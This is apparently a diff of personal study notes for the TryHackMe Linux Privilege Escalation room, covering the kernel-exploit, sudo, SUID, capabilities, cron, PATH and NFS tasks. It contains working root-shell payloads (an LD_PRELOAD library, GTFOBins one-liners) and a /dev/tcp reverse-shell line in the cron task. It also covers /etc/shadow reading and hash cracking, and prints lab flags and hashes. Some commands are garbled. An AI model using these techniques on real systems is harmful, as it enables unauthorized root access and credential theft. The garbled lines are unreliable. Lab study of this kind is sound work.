@@ -12,6 +12,8 @@ Ref:
 
 - [THM: Linux Privilege Escalation](https://tryhackme.com/r/room/linprivesc)
 
+- [THM Room: John the Ripper](https://tryhackme.com/room/johntheripper0)
+
 - [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 
 
 - [LinEnum](https://github.com/rebootuser/LinEnum)
@@ -25,6 +27,10 @@ Ref:
 - [CVE](https://cve.org/)
 
 - [NIST](https://nvd.nist.gov/vuln)
+
+- [GTFOBins - Sudo Right Information ](https://gtfobins.github.io)
+
+- [GTFOBins - Prefilter SUID](https://gtfobins.github.io/#+suid)
 
 - [Named Pipe](https://www.linuxjournal.com/article/2156) 
 
@@ -50,6 +56,7 @@ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid
 - [DisroWatch](https://distrowatch.com/dwres.php?resource=major "Link")
 
 - [Link](https://www.youtube.com/watch?v=7WQndt-1WzE)
+
 
 
 ---
@@ -423,12 +430,686 @@ Although it looks simple, please remember that a failed kernel exploit can lead 
 
 4. You can transfer the exploit code from your machine to the target system using the ```SimpleHTTPServer``` Python module and ```wget``` respectively.
 
-
+Start Kali Attackbox
 ---
 Step 1: Search the exploit code
 ![img](/assets/img/lpe21.png)
-Link: https://www.exploit-db.com/download/37292
+- Link: https://www.exploit-db.com/download/37292
 
 Step 2: download the code the attack machine
-Ref: https://www.hostinger.com/tutorials/wget-command-examples/
-wget https://www.exploit-db.com/download/37292.c
+```
+gcc 37292.c -o ofc
+wget  https://www.exploit-db.com/download/37292
+```
+Step 3: using python3 http.server cmd
+Ref: https://unix.stackexchange.com/questions/32182/simple-command-line-http-server
+```
+python3 -m http.server
+```
+
+Step 4: on the Target machine download the exploit file, 37292.c
+```
+wget http://10.10198.10:8000/ofc
+```
+Step 5: 
+
+Note:  
+[Simple HTTP Server with Upload](https://www.youtube.com/watch?v=au8DlTAHx5o)
+https://github.com/gotbletu/shownotes/blob/master/simplehttpserver.txt
+https://github.com/tualatrix/tools/blob/master/SimpleHTTPServerWithUpload.py
+
+
+python2 
+
+```
+ls 
+ofc
+ls -la
+chmod +x ofc
+./ofc
+
+id
+cd /home/matt
+cat flag1.txt
+```
+
+Kill python http server
+```
+MYPORT=8888; 
+kill -9 `ps -ef |grep SimpleHTTPServer |grep $MYPORT |awk '{print $2}'`
+```
+Explain command line :
+- ```ps -ef```  : list all process.
+
+- ```grep SimpleHTTPServer ```: filter process which belong to "SimpleHTTPServer"
+
+- ```grep $MYPORT ```: filter again process belong to "SimpleHTTPServer" where port is MYPORT (.i.e: MYPORT=8888)
+
+- ```awk '{print $2}'``` : print second column of result which is the PID (Process ID)
+
+- ```kill -9 <PID> ```: Force Kill process with the appropriate PID.
+
+
+Task 6 Privilege Escalation: Sudo
+---
+
+The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.
+
+Any user can check its current situation related to root privileges using the ```sudo -l``` command.
+
+https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
+
+#### Leverage application functions
+---
+Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.
+
+In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).
+![img](/assets/img/lpe22.png)
+
+
+Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.
+
+#### Leverage LD_PRELOAD
+---
+
+On some systems, you may see the ```LD_PRELOAD``` environment option.
+![img](/assets/img/lpe23.png)
+
+LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
+
+The steps of this privilege escalation vector can be summarized as follows;
+
+1. Check for LD_PRELOAD (with the env_keep option)
+2. Write a simple C code compiled as a share object (.so extension) file
+3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
+
+The C code will simply spawn a root shell and can be written as follows;
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+
+We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;
+```
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+![img](/assets/img/lpe24.png)
+
+We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
+
+We need to run the program by specifying the LD_PRELOAD option, as follows;
+```
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+```
+This will result in a shell spawn with root privileges.
+
+![img](/assets/img/lpe25.png)
+
+---
+
+1. How many programs can the user "karen" run on the target system with sudo rights? Answer: 3
+```
+id
+```
+
+uid=1001(karen) gid=1001(karen) groups=1001(karen)
+
+```
+sudo -l
+```
+```
+User karen may run the following commands on ip-10-10-131-208:
+    
+    (ALL) NOPASSWD: /usr/bin/find
+    (ALL) NOPASSWD: /usr/bin/less
+    (ALL) NOPASSWD: /usr/bin/nano
+```
+---
+
+2. What is the content of the flag2.txt file?
+
+THM-402028394
+
+Step 1 - GTFOBins - privilege esclation on Karen - nano sudo right -
+![img](/assets/img/lpe26.png)
+
+
+---
+
+3. How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
+```
+sudo --namp interactive
+```
+
+
+4. What is the hash of frank's password?
+
+6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH .joV14aDEwW1c3CahzB1uaqeLR1
+```
+cat /etc/shadow
+```
+![img](/assets/img/lpe27.png)
+
+---
+
+Task 7 Privilege Escalation: SUID
+---
+
+Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with ```SUID (Set-user Identification)``` and ```SGID (Set-group Identification)```. These allow files to be executed with the permission level of the file owner or the group owner, respectively.
+
+You will notice these files have an ```“s”``` bit set showing their special permission level.
+
+List files that have SUID or SGID bits set.
+```
+find / -type f -perm -04000 -ls 2>/dev/null 
+```
+![img](/assets/img/lpe28.png)
+
+
+A good practice would be to compare executables on this list with [GTFOBins](https://gtfobins.github.io). 
+
+Clicking on the ```SUID button``` will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list https://gtfobins.github.io/#+suid).
+
+
+
+The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.
+
+![img](/assets/img/lpe29.png)
+
+
+Note: The attached VM has another binary with SUID other than ```nano```.
+
+The ```SUID bit set``` for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. 
+
+At this stage, we have two basic options for privilege escalation: reading the ```/etc/shadow``` file or adding our user to ```/etc/passwd```.
+
+Below are simple steps using both vectors.
+
+reading the /etc/shadow file
+
+We see that the ```nano text editor``` has the ```SUID bit set``` by running the command below.
+```
+find / -type f -perm -04000 -ls 2>/dev/null command.
+```
+
+Print the contents of the /etc/shadow file.
+```
+nano /etc/shadow
+```
+ We can now use the unshadow tool to create a file crackable by John the Ripper. 
+ 
+To achieve this, unshadow needs both the /etc/shadow and /etc/passwd files.
+
+![img](/assets/img/lpe30.png)
+
+The unshadow tool’s usage can be seen below;
+```
+unshadow passwd.txt shadow.txt > passwords.txt
+```
+![img](/assets/img/lpe31.png)
+
+With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. 
+
+- For a more detailed room on John the Ripper, you can visit https://tryhackme.com/room/johntheripper0
+
+
+
+The other option would be to ```add a new user that has root privileges```. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:
+
+
+
+We will need the hash value of the password we want the new user to have. This can be done quickly using the ```openssl tool``` on Kali Linux.
+
+![img](/assets/img/lpe32.png)
+
+We will then add this password with a username to the /etc/passwd file.
+
+![img](/assets/img/lpe33.png)
+
+Once our user is added (please note how ```root:/bin/bash``` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.
+
+![img](/assets/img/lpe34.png)
+
+Now it's your turn to use the skills you were just taught to find a vulnerable binary.
+
+1. Which user shares the name of a great comic book writer?
+
+![img](/assets/img/lpe35.png)
+```
+cat /etc/passwd
+```
+
+2. What is the password of user2? Password1
+
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+
+=> base64 => search GTFOBins on base64 filter with SUID
+https://gtfobins.github.io/gtfobins/base64/
+```
+LFILE=/etc/shadow
+/usr/bin/base64 "$LFILE" | base64 --decode
+
+```
+
+
+
+=> get the hash of user2
+```
+$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHX
+h9F2CbwmD4Epi1Wgh.Cl.VV1mb/
+```
+```
+touch user2
+cat user2 
+```
+
+=> User John the Ripper to decode
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt user2
+sudo john user2
+```
+21:17
+
+3. What is the content of the flag3.txt file?
+
+![img](/assets/img/lpe36.png)
+use user2 to login and get the flag
+```
+su user2
+```
+or 
+use LFILE
+```
+LFILE=/home/ubuntu/flag3.txt 
+/usr/bin/base64 "$LFILE=" | base64 --decode
+```
+
+Task 8 Privilege Escalation: Capabilities
+---
+Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
+The capabilities man page provides detailed information on its usage and options.
+
+We can use the getcap tool to list enabled capabilities.
+![img](/assets/img/lpe37.png)
+
+When run as an unprivileged user, ```getcap -r /``` will generate a huge amount of errors, so it is good practice to redirect the error messages to ```/dev/null```.
+
+```Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.```
+
+![img](/assets/img/lpe38.png)
+
+GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.
+
+We notice that vim can be used with the following command and payload:
+
+![img](/assets/img/lpe39.png)
+
+This will launch a root shell as seen below;
+
+![img](/assets/img/lpe40.png)
+
+
+---
+1. How many binaries have set capabilities?
+Step 1 - 
+```
+getcap -r / 2>/dev/null
+```
+```
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_se
+rvice,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+```
+Step 2 - Search "View" capabilities in GTFOBINs
+
+![img](/assets/img/lpe41.png)
+
+
+```
+cp $(which view) .
+sudo setcap cap_setuid+ep view
+
+./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+```
+/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+
+```
+
+2. What other binary can be used through its capabilities?
+View
+3. What is the content of the flag4.txt file?
+THM-9349843
+
+---
+
+Task 9 - Privilege Escalation: Cron Jobs
+---
+Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
+```The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.```
+
+Cron job configurations are stored as ```crontabs``` (cron tables) to see the next time and date the task will run.
+
+Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a ```cron job set by root``` and have it run our script, ideally a shell.
+
+Any user can read the file keeping system-wide cron jobs under ```/etc/crontab```
+
+While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.
+
+![img](/assets/img/lpe42.png)
+
+You can see the ```backup.sh``` script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.
+
+
+![img](/assets/img/lpe43.png)
+
+As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.
+
+The script will use the tools available on the target system to launch a reverse shell.
+Two points to note;
+
+1. The command syntax will vary depending on the available tools. (e.g. nc will probably ```not support``` the ```-e``` option you may have seen used in other cases)
+2. We should always prefer to ```start reverse shells```, as we not want to compromise the system integrity during a real penetration testing engagement.
+
+The file should look like this;
+
+![img](/assets/img/lpe44.png)
+
+We will now run a listener on our attacking machine to receive the incoming connection.
+
+![img](/assets/img/lpe45.png)
+
+Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:
+
+1. System administrators need to run a script at regular intervals.
+2. They create a cron job to do this
+3. After a while, the script becomes useless, and they delete it
+4. They do not clean the relevant cron job
+
+This change management issue leads to a potential exploit leveraging cron jobs.
+
+![img](/assets/img/lpe46.png)
+
+The example above shows a similar situation where the ```antivirus.sh``` script was deleted, but the ```cron job``` still exists.
+If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the ```/etc/crontab``` file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.
+
+
+
+The file on the target system should look familiar:
+
+![img](/assets/img/lpe47.png)
+
+
+The incoming reverse shell connection has root privileges:
+
+![img](/assets/img/lpe48.png)
+
+In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.
+
+---
+
+1. How many user-defined cron jobs can you see on the target system?
+Step 1 - Check the current cron jobs
+```
+cat /etc/crontab
+```
+- Check Karen's access on backup.sh cron job. 
+```
+ls -la /home/karen/backup.sh
+```
+Step 2 - setup a listener on the Attacker machine
+```
+nc -lvnp 4545
+```
+Step 3 - edit Karen's backup.sh cron job as reverse shell
+```
+cd /home/karen
+nano backup.sh
+```
+![img](/assets/img/lpe49.png)
+```
+chmod +x backup.sh
+bash -l >& /dev/tcp/10.10.213.76/4545 0>&1
+```
+
+
+
+2. What is the content of the flag5.txt file?
+THM-383000283
+
+
+3. What is Matt's password?
+```
+cat /etc/psswd
+```
+```
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+karen:x:1001:1001::/home/karen:/bin/sh
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+matt:x:1002:1002::/home/matt:/bin/sh
+```
+
+```
+cat /etc/shadow
+```
+```
+$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.
+```
+=> use John the Ripper to decode the hash of matt's password
+![img](/assets/img/lpe50.png)
+
+---
+
+Task 10 - Privilege Escalation: PATH
+---
+If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. 
+
+For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).
+
+Typically the PATH will look like this:
+![img](/assets/img/lpe51.png)
+
+If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
+
+1. What folders are located under $PATH
+2. Does your current user have write privileges for any of these folders?
+3. Can you modify $PATH?
+4. Is there a script/application you can start that will be affected by this vulnerability?
+
+For demo purposes, we will use the script below:
+
+![img](/assets/img/lpe52.png)
+
+This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.
+
+
+We compile this into an executable and set the SUID bit.
+![img](/assets/img/lpe53.png)
+
+Our user now has access to the “path” script with SUID bit set.
+
+![img](/assets/img/lpe54.png)
+
+Once executed “path” will look for an executable named “thm” inside folders listed under PATH.
+
+
+If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege
+
+
+
+A simple search for writable folders can done using the 
+```
+find / -writable 2>/dev/null
+```
+The output of this command can be cleaned using a simple cut and sort sequence.
+
+![img](/assets/img/lpe55.png)
+
+Some CTF scenarios can present different folders but a regular system would output something like we see above.
+
+Comparing this with PATH will help us find folders we could use.
+
+![img](/assets/img/lpe56.png)
+
+
+An alternative could be the command below.
+
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+We have added “grep -v proc” to get rid of the many results related to running processes.
+
+
+Unfortunately, subfolders under /usr are not writable
+
+
+The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the ```“export PATH=/tmp:$PATH”``` command accomplishes this.
+
+![img](/assets/img/lpe57.png)
+
+At this point the path script will also look under the /tmp folder for an executable named “thm”.
+
+Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.
+
+![img](/assets/img/lpe58.png)
+
+We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.
+
+![img](/assets/img/lpe59.png)
+
+
+1. What is the odd folder you have write access for?
+/home/murdoch
+```
+cd home
+ls -la
+```
+2. Exploit the $PATH vulnerability to read the content of the flag6.txt file.
+
+#### Hint: 
+You can add the writable directory to your user's PATH and create a file named "thm" that the "./test" executable will read. The "thm" file can simply be a "cat" command that will read the flag file.
+
+```
+echo $PATH
+```
+```
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+```
+```
+cd murdoch
+nano thm.py
+export PATH=/tmp:$PATH
+echo $PATH
+nano thm
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(void) {
+   setuid(0)
+   setgid(0)
+   system("/bin/bash -p");
+   return 0;
+}
+
+chmod +x thm
+cd /tmp
+chmod +s thm
+cat /tmp/thm
+
+
+cd /home
+cd murdoch
+./test
+```
+
+or 
+```
+rm thm
+echo "/bin/bash" > thm
+chmod 777 thm
+ls -la
+cd /home/murdoch
+./test
+```
+
+```
+ls -la
+```
+
+3. What is the content of the flag6.txt file?
+```
+cd /home/matt
+cat flag6.txt
+THM-736628929
+```
+---
+
+Task 11 - Privilege Escalation: NFS
+---
+
+Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.
+
+Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.
+
+```NFS (Network File Sharing)``` configuration is kept in the ```/etc/exports``` file. This file is created during the NFS server installation and can usually be read by users.
+
+
+
+![img](/assets/img/lpe60.png)
+
+The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+We will start by enumerating mountable shares from our attacking machine.
+
+![img](/assets/img/lpe61.png)
+
+We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
+
+![img](/assets/img/lpe62.png)
+
+As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.
+
+![img](/assets/img/lpe63.png)
+
+Once we compile the code we will set the SUID bit.
+
+![img](/assets/img/lpe64.png)
+
+You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).
+
+![img](/assets/img/lpe65.png)
+
+Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.
+
+1. How many mountable shares can you identify on the target system?
+2. How many shares have the "no_root_squash" option enabled?
+3. Gain a root shell on the target system
+4. What is the content of the flag7.txt file?
+
+
+
